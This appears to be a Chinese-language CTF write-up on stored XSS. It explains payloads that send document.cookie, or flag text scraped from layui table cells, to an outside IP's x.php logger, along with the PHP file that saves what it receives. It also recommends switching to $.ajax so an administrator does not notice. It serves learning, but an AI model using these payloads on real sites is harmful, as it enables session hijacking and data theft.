X自己语句

X管理员（核心语句）：
  • <script> 标签: 这是浏览器识别并执行JavaScript代码的标准方式。
  • document.cookie: 这是JavaScript中用来读取当前网站下所有Cookie的对象（HttpOnly Cookie除外）。Cookie中通常包含最关键的认证信息，例如用户的会话ID（Session ID）。
  • document.location.href: 这是控制浏览器地址栏的属性。给它赋值，会强制浏览器立即跳转到指定的URL。
  • 字符串拼接: 将 http://47.110.94.3/x.php?1= 和读取到的 document.cookie 拼接成一个完整的URL。

这段代码的作用是： 当它在受害者的浏览器中被执行时，会立刻将浏览器重定向到你的服务器上的 x.php 文件，并将受害者当前网站的所有Cookie作为一个参数（参数名为 1）发送给你的服务器。

x.php内容如下

  • $_GET[1]: PHP的超全局数组，用于获取通过URL传递的GET参数。例如，访问 http://47.xx.94.3/x.php?1=hello，那么 $_GET[1] 的值就是 hello。
  • file_put_contents(): PHP函数，将内容写入文件。如果文件不存在，它会尝试创建。
  • tmp/flag.txt: 这是你指定的输出文件。请确保 tmp 目录存在并且有可写权限（通常需要 chmod 777 tmp 或类似权限），否则脚本会报错。

这个脚本的作用是： 接收从受害者浏览器发来的GET请求，取出其中的Cookie数据，然后安静地将这些数据保存到服务器的 tmp/flag.txt 文件中, 成功地窃取到了受害者的Cookie。

语句

分析

  1. $('.laytable-cell-1-0-1').each(...)
  • $('.laytable-cell-1-0-1')： 这是 jQuery 的选择器语法。它在整个 HTML 文档中查找所有 class 属性包含 laytable-cell-1-0-1 的 HTML 元素。
    • laytable 是一个常见的类名，通常来自于 layui 框架的 table 模块。这意味着目标网站很可能使用了 layui 来渲染表格。
    • 1-0-1 可能表示第1行、第0列（索引从0开始）的单元格，或者是一种通用的命名模式。攻击者通过分析网页结构，发现flag就藏在具有这类class的表格单元格中。
  • .each(function(index, value) { ... })： 这是一个 jQuery 方法，用于遍历前面选择器匹配到的每一个元素。对每个元素，都会执行一次括号内定义的函数。value 参数代表当前正在遍历的 DOM 元素本身。
  1. if (value.innerText.indexOf('ctfshow{') > -1)
  • value.innerText： 获取当前遍历的HTML元素的文本内容（不包括HTML标签）。
  • indexOf('ctfshow{') > -1： 检查获取到的文本内容中是否包含子字符串 ctfshow{。
    • ctfshow{ 是 CTF（Capture The Flag）竞赛中一种非常常见的flag格式的开头，格式通常为 ctfshow{This_is_a_flag}。
    • 如果字符串存在，indexOf() 返回其起始索引（>=0）；如果不存在，返回 -1。所以 > -1 判断为真，就意味着找到了flag。
  1. document.location.href = 'http://47.110.94.3/x.php?1=' + value.innerText;
  • 这是整个 payload 的最终目的——窃取数据。
  • document.location.href： 这是浏览器的当前地址。给这个属性赋一个新的 URL，会立即导致浏览器跳转到该地址。
  • 'http://47.110.94.3/x.php?1=' + value.innerText：
    • 这里构造了一个指向攻击者控制的服务器（47.110.94.3）上某个脚本（x.php）的 URL。
    • 它将找到的flag文本（value.innerText，例如 ctfshow{my_super_flag}）作为查询参数 1 的值附加在URL后面。
    • 当浏览器跳转到这个URL时，就会向攻击者的服务器发起一个 HTTP GET 请求。

利用ajax的隐蔽性和灵活性，可取代document.location.href

$.ajax()

  • 这是什么？ 这是 jQuery 库中用于执行异步HTTP（Ajax）请求的核心函数。Ajax允许网页在不重新加载整个页面的情况下，与服务器交换数据并更新部分网页内容。
  • 为什么用Ajax？
    • 隐蔽性： 与 document.location.href（会导致浏览器地址栏变化、页面跳转）不同，Ajax请求在后台静默完成。管理员可能只会看到页面稍微“卡顿”了一下，甚至完全察觉不到任何异常，攻击就已经完成了。
    • 灵活性： 可以发送各种类型的请求（GET, POST, PUT, DELETE等），并且可以方便地设置发送的数据。

前提条件： 目标网站的管理后台页面必须已经加载了jQuery库，这个攻击脚本才能工作。因为 $ 是jQuery的标识符。如果后台没有使用jQuery，这段代码会报错（$ is not defined）。在实际攻击中，攻击者会先侦查目标环境。
